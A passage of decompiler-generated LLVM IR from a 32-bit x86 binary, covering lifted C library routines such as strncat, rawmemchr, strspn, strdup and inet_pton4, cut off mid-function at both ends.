  %v7_8053b86 = phi i32 [ %v10_8053b86, %dec_label_pc_8053b8a ], [ %v4_8053b7e, %entry ]
  %v1_8053b86 = inttoptr i32 %v7_8053b86 to i8*
  %v2_8053b86 = load i8, i8* %v1_8053b86, align 1
  %v3_8053b87 = inttoptr i32 %v20_8053b87 to i8*
  %v4_8053b87 = load i8, i8* %v3_8053b87, align 1
  %v15_8053b87 = icmp eq i8 %v2_8053b86, %v4_8053b87
  %v1_8053b88 = icmp eq i1 %v15_8053b87, false
  br i1 %v1_8053b88, label %dec_label_pc_8053b92, label %dec_label_pc_8053b8a

dec_label_pc_8053b8a:                             ; preds = %dec_label_pc_8053b86
  %v3_8053b86 = zext i8 %v2_8053b86 to i32
  %v5_8053b86 = and i32 %v4_8053b86, -256
  %v6_8053b86 = or i32 %v3_8053b86, %v5_8053b86
  %v23_8053b87 = add i32 %v20_8053b87, %v9_8053b86
  %v10_8053b86 = add i32 %v7_8053b86, %v9_8053b86
  %v4_8053b8a = icmp eq i8 %v2_8053b86, 0
  %v1_8053b8c = icmp eq i1 %v4_8053b8a, false
  br i1 %v1_8053b8c, label %dec_label_pc_8053b86, label %dec_label_pc_8053b96

dec_label_pc_8053b92:                             ; preds = %dec_label_pc_8053b86
  br label %dec_label_pc_8053b96

dec_label_pc_8053b96:                             ; preds = %dec_label_pc_8053b8a, %dec_label_pc_8053b92
  %storemerge = phi i32 [ 1, %dec_label_pc_8053b92 ], [ 0, %dec_label_pc_8053b8a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8053b86, { 1, 2, 0 }
  uselistorder i32 %v9_8053b86, { 1, 0 }
  uselistorder label %dec_label_pc_8053b96, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053b9f = load i32, i32* @esi, align 4
  store i32 %v0_8053b9f, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8053ba3 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8053ba3, i32* %esi.global-to-local, align 4
  %v4_8053bab = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8053baf = call i32 @_strlen(i8* %v4_8053bab)
  %v2_8053bb1 = add i32 %tmp, -1
  store i32 %v2_8053bb1, i32* %edi.global-to-local, align 4
  %v8_8053bb513 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053bb513, label %dec_label_pc_8053bc0, label %dec_label_pc_8053bb8.lr.ph

dec_label_pc_8053bb8.lr.ph:                       ; preds = %entry
  %v4_8053bb8.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8053bb8.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8053bb8

dec_label_pc_8053bb8:                             ; preds = %dec_label_pc_8053bb8.lr.ph, %dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge
  %v8_8053bb8 = phi i1 [ %v8_8053bb8.pre, %dec_label_pc_8053bb8.lr.ph ], [ %v5_8053bb9, %dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge ]
  %v4_8053bb8 = phi i32 [ %v4_8053bb8.pre, %dec_label_pc_8053bb8.lr.ph ], [ %v0_8053bba, %dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge ]
  %v2_8053bc215 = phi i32 [ %v2_8053bb1, %dec_label_pc_8053bb8.lr.ph ], [ %v7_8053bb9, %dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge ]
  %v0_8053bb8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053bb8 = inttoptr i32 %v0_8053bb8 to i8*
  %v2_8053bb8 = load i8, i8* %v1_8053bb8, align 1
  %v3_8053bb8 = zext i8 %v2_8053bb8 to i32
  %v5_8053bb8 = and i32 %v4_8053bb8, -256
  %v6_8053bb8 = or i32 %v5_8053bb8, %v3_8053bb8
  store i32 %v6_8053bb8, i32* %eax.global-to-local, align 4
  %v9_8053bb8 = select i1 %v8_8053bb8, i32 -1, i32 1
  %v10_8053bb8 = add i32 %v9_8053bb8, %v0_8053bb8
  store i32 %v10_8053bb8, i32* %esi.global-to-local, align 4
  %v3_8053bb9 = inttoptr i32 %v2_8053bc215 to i8*
  store i8 %v2_8053bb8, i8* %v3_8053bb9, align 1
  %v4_8053bb9 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053bb9 = load i1, i1* @df, align 1
  %v6_8053bb9 = select i1 %v5_8053bb9, i32 -1, i32 1
  %v7_8053bb9 = add i32 %v6_8053bb9, %v4_8053bb9
  store i32 %v7_8053bb9, i32* %edi.global-to-local, align 4
  %v0_8053bba = load i32, i32* %eax.global-to-local, align 4
  %v3_8053bba = trunc i32 %v0_8053bba to i8
  %v4_8053bba = icmp eq i8 %v3_8053bba, 0
  %v1_8053bbc = icmp eq i1 %v4_8053bba, false
  br i1 %v1_8053bbc, label %dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge, label %dec_label_pc_8053bc3

dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge: ; preds = %dec_label_pc_8053bb8
  %v0_8053bb5.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053bb5 = add i32 %v0_8053bb5.pre, -1
  %v8_8053bb5 = icmp eq i32 %v1_8053bb5, 0
  store i32 %v1_8053bb5, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053bb5, label %dec_label_pc_8053bc0, label %dec_label_pc_8053bb8

dec_label_pc_8053bc0:                             ; preds = %dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge, %entry
  %v2_8053bc2.lcssa = phi i32 [ %v2_8053bb1, %entry ], [ %v7_8053bb9, %dec_label_pc_8053bb8.dec_label_pc_8053bb5_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8053bc2 = inttoptr i32 %v2_8053bc2.lcssa to i8*
  store i8 0, i8* %v3_8053bc2, align 1
  %v4_8053bc2 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053bc2 = load i1, i1* @df, align 1
  %v6_8053bc2 = select i1 %v5_8053bc2, i32 -1, i32 1
  %v7_8053bc2 = add i32 %v6_8053bc2, %v4_8053bc2
  store i32 %v7_8053bc2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053bc3

dec_label_pc_8053bc3:                             ; preds = %dec_label_pc_8053bb8, %dec_label_pc_8053bc0
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8053bc7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053bc7, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8053bb5, { 1, 0 }
  uselistorder i32 %v0_8053bba, { 1, 0 }
  uselistorder i32 %v7_8053bb9, { 0, 2, 1 }
  uselistorder i1 %v5_8053bb9, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8053bc3, { 1, 0 }
  uselistorder label %dec_label_pc_8053bb8, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053bcd = load i32, i32* @ebx, align 4
  %v4_8053bce = urem i32 %arg2, 256
  %v4_8053bd2 = ptrtoint i8* %arg1 to i32
  %v2_8053bdd3 = urem i32 %v4_8053bd2, 4
  %v3_8053bdd4 = icmp eq i32 %v2_8053bdd3, 0
  %v1_8053bdf8 = icmp eq i1 %v3_8053bdd4, false
  %v4_8053bd8 = trunc i32 %arg2 to i8
  br i1 %v1_8053bdf8, label %dec_label_pc_8053bd8, label %dec_label_pc_8053be1

dec_label_pc_8053bd8:                             ; preds = %entry, %dec_label_pc_8053bdc
  %v0_8053bdc = phi i32 [ %v1_8053bdc, %dec_label_pc_8053bdc ], [ %v4_8053bd2, %entry ]
  %v1_8053bd8 = inttoptr i32 %v0_8053bdc to i8*
  %v2_8053bd8 = load i8, i8* %v1_8053bd8, align 1
  %v15_8053bd8 = icmp eq i8 %v2_8053bd8, %v4_8053bd8
  br i1 %v15_8053bd8, label %dec_label_pc_8053c2c, label %dec_label_pc_8053bdc

dec_label_pc_8053bdc:                             ; preds = %dec_label_pc_8053bd8
  %v1_8053bdc = add i32 %v0_8053bdc, 1
  %v2_8053bdd = urem i32 %v1_8053bdc, 4
  %v3_8053bdd = icmp eq i32 %v2_8053bdd, 0
  %v1_8053bdf = icmp eq i1 %v3_8053bdd, false
  br i1 %v1_8053bdf, label %dec_label_pc_8053bd8, label %dec_label_pc_8053be1

dec_label_pc_8053be1:                             ; preds = %entry, %dec_label_pc_8053bdc
  %v0_8053be4 = phi i32 [ %v1_8053bdc, %dec_label_pc_8053bdc ], [ %v4_8053bd2, %entry ]
  %v2_8053be8 = mul nuw nsw i32 %v4_8053bce, 256
  %v2_8053beb = or i32 %v2_8053be8, %v4_8053bce
  %v2_8053bef = mul i32 %v2_8053beb, 65536
  %v2_8053bf2 = or i32 %v2_8053bef, %v2_8053beb
  br label %dec_label_pc_8053bf4

dec_label_pc_8053bf4:                             ; preds = %dec_label_pc_8053c24, %dec_label_pc_8053bf4, %dec_label_pc_8053be1
  %v0_8053bf8 = phi i32 [ %v0_8053be4, %dec_label_pc_8053be1 ], [ %v1_8053bf8, %dec_label_pc_8053bf4 ], [ %v1_8053bf8, %dec_label_pc_8053c24 ]
  %v2_8053bf6 = inttoptr i32 %v0_8053bf8 to i32*
  %v3_8053bf6 = load i32, i32* %v2_8053bf6, align 4
  %v4_8053bf6 = xor i32 %v3_8053bf6, %v2_8053bf2
  %v1_8053bf8 = add i32 %v0_8053bf8, 4
  store i32 %v1_8053bf8, i32* @ecx, align 4
  %v1_8053bfb = add i32 %v4_8053bf6, 2130640639
  %v1_8053c01 = sub i32 -1, %v4_8053bf6
  store i32 %v1_8053c01, i32* @edx, align 4
  %v2_8053c03 = xor i32 %v1_8053bfb, %v1_8053c01
  %v1_8053c05 = and i32 %v2_8053c03, -2130640640
  %v2_8053c05 = icmp eq i32 %v1_8053c05, 0
  br i1 %v2_8053c05, label %dec_label_pc_8053bf4, label %dec_label_pc_8053c0c

dec_label_pc_8053c0c:                             ; preds = %dec_label_pc_8053bf4
  %v2_8053c0c = inttoptr i32 %v0_8053bf8 to i8*
  %v3_8053c0c = load i8, i8* %v2_8053c0c, align 1
  %v16_8053c0c = icmp eq i8 %v3_8053c0c, %v4_8053bd8
  br i1 %v16_8053c0c, label %dec_label_pc_8053c2c, label %dec_label_pc_8053c14

dec_label_pc_8053c14:                             ; preds = %dec_label_pc_8053c0c
  %v1_8053c14 = add i32 %v0_8053bf8, 1
  %v2_8053c14 = inttoptr i32 %v1_8053c14 to i8*
  %v3_8053c14 = load i8, i8* %v2_8053c14, align 1
  %v16_8053c14 = icmp eq i8 %v3_8053c14, %v4_8053bd8
  br i1 %v16_8053c14, label %dec_label_pc_8053c2c, label %dec_label_pc_8053c1c

dec_label_pc_8053c1c:                             ; preds = %dec_label_pc_8053c14
  %v1_8053c1c = add i32 %v0_8053bf8, 2
  %v2_8053c1c = inttoptr i32 %v1_8053c1c to i8*
  %v3_8053c1c = load i8, i8* %v2_8053c1c, align 1
  %v16_8053c1c = icmp eq i8 %v3_8053c1c, %v4_8053bd8
  br i1 %v16_8053c1c, label %dec_label_pc_8053c2c, label %dec_label_pc_8053c24

dec_label_pc_8053c24:                             ; preds = %dec_label_pc_8053c1c
  %v1_8053c24 = add i32 %v0_8053bf8, 3
  %v2_8053c24 = inttoptr i32 %v1_8053c24 to i8*
  %v3_8053c24 = load i8, i8* %v2_8053c24, align 1
  %v16_8053c24 = icmp eq i8 %v3_8053c24, %v4_8053bd8
  %v1_8053c2a = icmp eq i1 %v16_8053c24, false
  br i1 %v1_8053c2a, label %dec_label_pc_8053bf4, label %dec_label_pc_8053c2c

dec_label_pc_8053c2c:                             ; preds = %dec_label_pc_8053bd8, %dec_label_pc_8053c24, %dec_label_pc_8053c1c, %dec_label_pc_8053c14, %dec_label_pc_8053c0c
  %v0_8053c2e = phi i32 [ %v1_8053c24, %dec_label_pc_8053c24 ], [ %v1_8053c1c, %dec_label_pc_8053c1c ], [ %v1_8053c14, %dec_label_pc_8053c14 ], [ %v0_8053bf8, %dec_label_pc_8053c0c ], [ %v0_8053bdc, %dec_label_pc_8053bd8 ]
  store i32 %v0_8053bcd, i32* @ebx, align 4
  ret i32 %v0_8053c2e

; uselistorder directives
  uselistorder i32 %v1_8053c01, { 1, 0 }
  uselistorder i32 %v1_8053bf8, { 2, 1, 0 }
  uselistorder i32 %v2_8053beb, { 1, 0 }
  uselistorder i32 %v1_8053bdc, { 1, 0, 2 }
  uselistorder i8 %v4_8053bd8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8053bd2, { 2, 1, 0 }
  uselistorder i32 %v4_8053bce, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8053c2c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053be1, { 1, 0 }
  uselistorder label %dec_label_pc_8053bd8, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8053c5231 = load i8, i8* %arg1, align 1
  %v4_8053c5435 = icmp eq i8 %v2_8053c5231, 0
  br i1 %v4_8053c5435, label %dec_label_pc_8053c5c, label %dec_label_pc_8053c58.lr.ph

dec_label_pc_8053c58.lr.ph:                       ; preds = %entry
  %v3_8053c5232 = zext i8 %v2_8053c5231 to i32
  %v4_8053c52.pre = load i32, i32* @eax, align 4
  %v5_8053c5233 = and i32 %v4_8053c52.pre, -256
  %v6_8053c5234 = or i32 %v3_8053c5232, %v5_8053c5233
  %v4_8053c39 = ptrtoint i8* %arg1 to i32
  %v1_8053c4418 = inttoptr i32 %arg2 to i8*
  %v4_8053c44.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053c58

dec_label_pc_8053c3f:                             ; preds = %dec_label_pc_8053c58, %dec_label_pc_8053c43
  %v6_8053c4428 = phi i32 [ %v6_8053c44, %dec_label_pc_8053c43 ], [ %v6_8053c4422, %dec_label_pc_8053c58 ]
  %v2_8053c4427 = phi i8 [ %v2_8053c44, %dec_label_pc_8053c43 ], [ %v2_8053c4419, %dec_label_pc_8053c58 ]
  %v0_8053c4326 = phi i32 [ %v1_8053c43, %dec_label_pc_8053c43 ], [ %arg2, %dec_label_pc_8053c58 ]
  %v15_8053c3f = icmp eq i8 %v2_8053c5239, %v2_8053c4427
  br i1 %v15_8053c3f, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c43

dec_label_pc_8053c43:                             ; preds = %dec_label_pc_8053c3f
  %v1_8053c43 = add i32 %v0_8053c4326, 1
  store i32 %v1_8053c43, i32* @edx, align 4
  %v1_8053c44 = inttoptr i32 %v1_8053c43 to i8*
  %v2_8053c44 = load i8, i8* %v1_8053c44, align 1
  %v3_8053c44 = zext i8 %v2_8053c44 to i32
  %v5_8053c44 = and i32 %v6_8053c4428, -256
  %v6_8053c44 = or i32 %v3_8053c44, %v5_8053c44
  store i32 %v6_8053c44, i32* @ecx, align 4
  %v4_8053c46 = icmp eq i8 %v2_8053c44, 0
  %v1_8053c48 = icmp eq i1 %v4_8053c46, false
  br i1 %v1_8053c48, label %dec_label_pc_8053c3f, label %dec_label_pc_8053c5c

dec_label_pc_8053c4c:                             ; preds = %dec_label_pc_8053c3f
  %v1_8053c50 = add i32 %v0_8053c5d37, 1
  %v1_8053c51 = add i32 %v0_8053c5138, 1
  %v1_8053c52 = inttoptr i32 %v1_8053c51 to i8*
  %v2_8053c52 = load i8, i8* %v1_8053c52, align 1
  %v3_8053c52 = zext i8 %v2_8053c52 to i32
  %v5_8053c52 = and i32 %v6_8053c5240, -256
  %v6_8053c52 = or i32 %v3_8053c52, %v5_8053c52
  %v4_8053c54 = icmp eq i8 %v2_8053c52, 0
  br i1 %v4_8053c54, label %dec_label_pc_8053c5c, label %dec_label_pc_8053c58

dec_label_pc_8053c58:                             ; preds = %dec_label_pc_8053c58.lr.ph, %dec_label_pc_8053c4c
  %v4_8053c44.pre = phi i32 [ %v4_8053c44.pre.pre, %dec_label_pc_8053c58.lr.ph ], [ %v6_8053c4428, %dec_label_pc_8053c4c ]
  %v6_8053c5240 = phi i32 [ %v6_8053c5234, %dec_label_pc_8053c58.lr.ph ], [ %v6_8053c52, %dec_label_pc_8053c4c ]
  %v2_8053c5239 = phi i8 [ %v2_8053c5231, %dec_label_pc_8053c58.lr.ph ], [ %v2_8053c52, %dec_label_pc_8053c4c ]
  %v0_8053c5138 = phi i32 [ %v4_8053c39, %dec_label_pc_8053c58.lr.ph ], [ %v1_8053c51, %dec_label_pc_8053c4c ]
  %v0_8053c5d37 = phi i32 [ 0, %dec_label_pc_8053c58.lr.ph ], [ %v1_8053c50, %dec_label_pc_8053c4c ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8053c4419 = load i8, i8* %v1_8053c4418, align 1
  %v3_8053c4420 = zext i8 %v2_8053c4419 to i32
  %v5_8053c4421 = and i32 %v4_8053c44.pre, -256
  %v6_8053c4422 = or i32 %v3_8053c4420, %v5_8053c4421
  store i32 %v6_8053c4422, i32* @ecx, align 4
  %v4_8053c4623 = icmp eq i8 %v2_8053c4419, 0
  %v1_8053c4825 = icmp eq i1 %v4_8053c4623, false
  br i1 %v1_8053c4825, label %dec_label_pc_8053c3f, label %dec_label_pc_8053c5c

dec_label_pc_8053c5c:                             ; preds = %entry, %dec_label_pc_8053c4c, %dec_label_pc_8053c58, %dec_label_pc_8053c43
  %v0_8053c5d17 = phi i32 [ %v0_8053c5d37, %dec_label_pc_8053c43 ], [ %v0_8053c5d37, %dec_label_pc_8053c58 ], [ 0, %entry ], [ %v1_8053c50, %dec_label_pc_8053c4c ]
  ret i32 %v0_8053c5d17

; uselistorder directives
  uselistorder i32 %v6_8053c4422, { 1, 0 }
  uselistorder i8 %v2_8053c4419, { 1, 2, 0 }
  uselistorder i32 %v1_8053c51, { 1, 0 }
  uselistorder i32 %v6_8053c44, { 1, 0 }
  uselistorder i8 %v2_8053c44, { 1, 2, 0 }
  uselistorder i32 %v1_8053c43, { 2, 1, 0 }
  uselistorder i8 %v2_8053c5231, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053c5c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8053c58, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053c64 = load i32, i32* @edi, align 4
  %v0_8053c65 = load i32, i32* @esi, align 4
  %v0_8053c66 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c66, i32* %stack_var_-12, align 4
  %v4_8053c67 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053c67, i32* @edi, align 4
  %v3_8053c6f = call i32 @strlen(i8* %arg1)
  %v1_8053c74 = add i32 %v3_8053c6f, 1
  store i32 %v1_8053c74, i32* @esi, align 4
  %v2_8053c7a = call i32 @malloc(i32 %v1_8053c74)
  %v1_8053c82 = icmp eq i32 %v2_8053c7a, 0
  store i32 %v2_8053c7a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8053c82, label %dec_label_pc_8053c94, label %dec_label_pc_8053c88

dec_label_pc_8053c88:                             ; preds = %entry
  %v0_8053c89 = load i32, i32* @esi, align 4
  %v0_8053c8a = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8053c7a to i16*
  %v6_8053c8c = call i32 @memcpy(i16* %tmp11, i32 %v0_8053c8a, i32 %v0_8053c89)
  %v0_8053c94.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c94

dec_label_pc_8053c94:                             ; preds = %entry, %dec_label_pc_8053c88
  %v0_8053c94 = phi i32 [ 0, %entry ], [ %v0_8053c94.pre, %dec_label_pc_8053c88 ]
  %v2_8053c96 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053c96, i32* @ebx, align 4
  store i32 %v0_8053c65, i32* @esi, align 4
  store i32 %v0_8053c64, i32* @edi, align 4
  ret i32 %v0_8053c94

; uselistorder directives
  uselistorder i32 %v2_8053c7a, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 9, 8, 7, 17, 16, 15, 2, 4, 0, 14, 13, 12, 11, 10, 6, 5, 3, 1 }
  uselistorder label %dec_label_pc_8053c94, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8053ca2 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8053ca5 = load i32, i32* @ebx, align 4
  store i32 %v0_8053ca5, i32* %stack_var_-16, align 4
  %v0_8053ca6 = load i32, i32* @eax, align 4
  store i32 %v0_8053ca6, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8053ca8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8053cab = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053cab, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8053cf315 = inttoptr i32 %v0_8053ca6 to i8*
  %v2_8053cf316 = load i8, i8* %v1_8053cf315, align 1
  %v3_8053cf317 = sext i8 %v2_8053cf316 to i32
  store i32 %v3_8053cf317, i32* @ecx, align 4
  %v1_8053cf618 = add i32 %v0_8053ca6, 1
  store i32 %v1_8053cf618, i32* %ebx.global-to-local, align 4
  %v1_8053cf719 = icmp eq i8 %v2_8053cf316, 0
  store i1 %v1_8053cf719, i1* %zf.global-to-local, align 1
  %v1_8053cf921 = icmp eq i1 %v1_8053cf719, false
  br i1 %v1_8053cf921, label %dec_label_pc_8053cb6, label %dec_label_pc_8053cfb

dec_label_pc_8053cb6:                             ; preds = %entry, %dec_label_pc_8053cf3.backedge
  %v3_8053cf323 = phi i32 [ %v3_8053cf3, %dec_label_pc_8053cf3.backedge ], [ %v3_8053cf317, %entry ]
  %v2_8053cf322 = phi i8 [ %v2_8053cf3, %dec_label_pc_8053cf3.backedge ], [ %v2_8053cf316, %entry ]
  %v1_8053cb6 = add nsw i32 %v3_8053cf323, -48
  store i32 %v1_8053cb6, i32* @eax, align 4
  %v9_8053cb9 = icmp eq i8 %v2_8053cf322, 57
  store i1 %v9_8053cb9, i1* %zf.global-to-local, align 1
  %v6_8053cbc = icmp ugt i32 %v1_8053cb6, 9
  br i1 %v6_8053cbc, label %dec_label_pc_8053cdf, label %dec_label_pc_8053cbe

dec_label_pc_8053cbe:                             ; preds = %dec_label_pc_8053cb6
  %v0_8053cbe = load i32, i32* @esi, align 4
  %v1_8053cbe = inttoptr i32 %v0_8053cbe to i8*
  %v2_8053cbe = load i8, i8* %v1_8053cbe, align 1
  %v2_8053cc1 = zext i8 %v2_8053cbe to i32
  %v3_8053cc1 = mul nuw nsw i32 %v2_8053cc1, 10
  %v3_8053cc4 = add nsw i32 %v3_8053cc1, %v1_8053cb6
  store i32 %v3_8053cc4, i32* @eax, align 4
  %v9_8053cc8 = icmp eq i32 %v3_8053cc4, 255
  store i1 %v9_8053cc8, i1* %zf.global-to-local, align 1
  %v6_8053ccd = icmp ugt i32 %v3_8053cc4, 255
  br i1 %v6_8053ccd, label %dec_label_pc_8053d18, label %dec_label_pc_8053ccf

dec_label_pc_8053ccf:                             ; preds = %dec_label_pc_8053cbe
  %v0_8053ccf = load i32, i32* @edx, align 4
  %v1_8053ccf = icmp eq i32 %v0_8053ccf, 0
  store i1 %v1_8053ccf, i1* %zf.global-to-local, align 1
  %v1_8053cd1 = trunc i32 %v3_8053cc4 to i8
  store i8 %v1_8053cd1, i8* %v1_8053cbe, align 1
  %v0_8053cd3 = load i1, i1* %zf.global-to-local, align 1
  %v1_8053cd3 = icmp eq i1 %v0_8053cd3, false
  br i1 %v1_8053cd3, label %dec_label_pc_8053cf3.backedge, label %dec_label_pc_8053cd5

dec_label_pc_8053cd5:                             ; preds = %dec_label_pc_8053ccf
  %v0_8053cd5 = load i32, i32* @edi, align 4
  %v1_8053cd5 = add i32 %v0_8053cd5, 1
  store i32 %v1_8053cd5, i32* @edi, align 4
  %v1_8053cd6 = add i32 %v0_8053cd5, -3
  %v6_8053cd6 = sub i32 2, %v0_8053cd5
  %v7_8053cd6 = and i32 %v6_8053cd6, %v1_8053cd5
  %v8_8053cd6 = icmp slt i32 %v7_8053cd6, 0
  %v9_8053cd6 = icmp eq i32 %v1_8053cd6, 0
  store i1 %v9_8053cd6, i1* %zf.global-to-local, align 1
  %v10_8053cd6 = icmp slt i32 %v1_8053cd6, 0
  %v3_8053cd9 = icmp eq i1 %v10_8053cd6, %v8_8053cd6
  %v4_8053cd9 = icmp eq i1 %v9_8053cd6, false
  %v5_8053cd9 = and i1 %v4_8053cd9, %v3_8053cd9
  br i1 %v5_8053cd9, label %dec_label_pc_8053d18, label %dec_label_pc_8053cdb

dec_label_pc_8053cdb:                             ; preds = %dec_label_pc_8053cd5
  %v0_8053cdb = load i32, i32* @edx, align 4
  %v1_8053cdb = and i32 %v0_8053cdb, -256
  %v2_8053cdb = or i32 %v1_8053cdb, 1
  store i32 %v2_8053cdb, i32* @edx, align 4
  br label %dec_label_pc_8053cf3.backedge

dec_label_pc_8053cdf:                             ; preds = %dec_label_pc_8053cb6
  %v9_8053cdf = icmp eq i8 %v2_8053cf322, 46
  store i1 %v9_8053cdf, i1* %zf.global-to-local, align 1
  %v1_8053ce2 = icmp eq i1 %v9_8053cdf, false
  br i1 %v1_8053ce2, label %dec_label_pc_8053d18, label %dec_label_pc_8053ce4

dec_label_pc_8053ce4:                             ; preds = %dec_label_pc_8053cdf
  %v0_8053ce4 = load i32, i32* @edx, align 4
  %v1_8053ce4 = icmp eq i32 %v0_8053ce4, 0
  store i1 %v1_8053ce4, i1* %zf.global-to-local, align 1
  br i1 %v1_8053ce4, label %dec_label_pc_8053d18, label %dec_label_pc_8053ce8

dec_label_pc_8053ce8:                             ; preds = %dec_label_pc_8053ce4
  %v0_8053ce8 = load i32, i32* @edi, align 4
  %v9_8053ce8 = icmp eq i32 %v0_8053ce8, 4
  store i1 %v9_8053ce8, i1* %zf.global-to-local, align 1
  br i1 %v9_8053ce8, label %dec_label_pc_8053d18, label %dec_label_pc_8053ced

dec_label_pc_8053ced:                             ; preds = %dec_label_pc_8053ce8
  %v0_8053ced = load i32, i32* @esi, align 4
  %v1_8053ced = add i32 %v0_8053ced, 1
  store i32 %v1_8053ced, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8053cf0 = inttoptr i32 %v1_8053ced to i8*
  store i8 0, i8* %v1_8053cf0, align 1
  br label %dec_label_pc_8053cf3.backedge

dec_label_pc_8053cf3.backedge:                    ; preds = %dec_label_pc_8053ced, %dec_label_pc_8053cdb, %dec_label_pc_8053ccf
  %v0_8053cf3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cf3 = inttoptr i32 %v0_8053cf3.pre to i8*
  %v2_8053cf3 = load i8, i8* %v1_8053cf3, align 1
  %v3_8053cf3 = sext i8 %v2_8053cf3 to i32
  store i32 %v3_8053cf3, i32* @ecx, align 4
  %v1_8053cf6 = add i32 %v0_8053cf3.pre, 1
  store i32 %v1_8053cf6, i32* %ebx.global-to-local, align 4
  %v1_8053cf7 = icmp eq i8 %v2_8053cf3, 0
  store i1 %v1_8053cf7, i1* %zf.global-to-local, align 1
  %v1_8053cf9 = icmp eq i1 %v1_8053cf7, false
  br i1 %v1_8053cf9, label %dec_label_pc_8053cb6, label %dec_label_pc_8053cf3.dec_label_pc_8053cfb_crit_edge

dec_label_pc_8053cf3.dec_label_pc_8053cfb_crit_edge: ; preds = %dec_label_pc_8053cf3.backedge
  %v0_8053cfb.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053cfb

dec_label_pc_8053cfb:                             ; preds = %dec_label_pc_8053cf3.dec_label_pc_8053cfb_crit_edge, %entry
  %v0_8053cfb = phi i32 [ %v0_8053cfb.pre, %dec_label_pc_8053cf3.dec_label_pc_8053cfb_crit_edge ], [ 0, %entry ]
  %v10_8053cfb = icmp eq i32 %v0_8053cfb, 3
  store i1 %v10_8053cfb, i1* %zf.global-to-local, align 1
  %v7_8053cfe = icmp sgt i32 %v0_8053cfb, 3
  br i1 %v7_8053cfe, label %dec_label_pc_8053d00, label %dec_label_pc_8053d18

dec_label_pc_8053d00:                             ; preds = %dec_label_pc_8053cfb
  %v0_8053d00 = load i32, i32* @eax, align 4
  %v3_8053d09 = bitcast i32* %stack_var_-20 to i16*
